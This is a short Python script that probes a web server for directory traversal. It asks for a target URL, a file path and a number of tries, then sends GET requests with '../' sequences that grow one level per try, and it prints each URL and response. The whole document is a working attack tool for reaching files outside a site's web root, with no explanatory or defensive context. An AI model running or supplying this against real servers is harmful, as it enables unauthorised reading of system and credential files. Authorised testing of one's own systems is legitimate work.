#!/usr/bin/python3
# -*- coding: utf-8 -*-


import requests

website = input("enter the URL to test: ")
payload = input("enter the payload without ../: ")
dotdotslash= "../"

looptime = int(input("enter number of tries: "))

x=0



while(x<looptime):
    dotdotslash += "../"
    newslash= dotdotslash
    print(website+newslash+payload)
    print(requests.get(website+newslash+payload))
    x+=1
